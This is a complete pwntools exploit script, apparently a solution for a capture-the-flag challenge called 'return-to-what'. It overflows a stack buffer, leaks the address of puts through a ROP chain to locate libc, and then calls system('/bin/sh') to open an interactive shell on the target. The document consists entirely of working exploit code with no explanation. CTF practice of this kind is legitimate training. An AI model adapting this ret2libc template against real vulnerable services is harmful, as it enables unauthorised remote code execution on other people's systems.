from pwn import *

context.update(arch='amd64', os='linux')
context.terminal = ['iterm2', 'new-window']

HOST, PORT = 'chal.duc.tf', 30003
BINARY = './return-to-what'
LIBC = './libc6_2.27-3ubuntu1_amd64.so'

elf  = ELF(BINARY)
libc = ELF(LIBC)

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = remote('127.0.0.1',9997)



rop = ROP(elf)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
libc_start_main = elf.symbols['__libc_start_main']

main = elf.symbols['main']

pop_rdi = (rop.find_gadget(['pop rdi','ret']))[0]

ret =  (rop.find_gadget(['ret']))[0]
info('libc_start_main %s',hex(libc_start_main))
payload = 'A'*56
payload += p64(pop_rdi)
# payload += p64(libc_start_main)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.recv()
p.sendline(payload)
puts = u64(p.recv().split('\n')[0].ljust(8,'\x00'))
info('puts %s',hex(puts))

libc.address = puts-libc.symbols['puts']
info('libc %s',hex(libc.address))


binsh = next(libc.search("/bin/sh"))

system = libc.sym["system"]


payload = 'A'*56
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
# p.recv()
p.send(payload)
p.interactive()


	

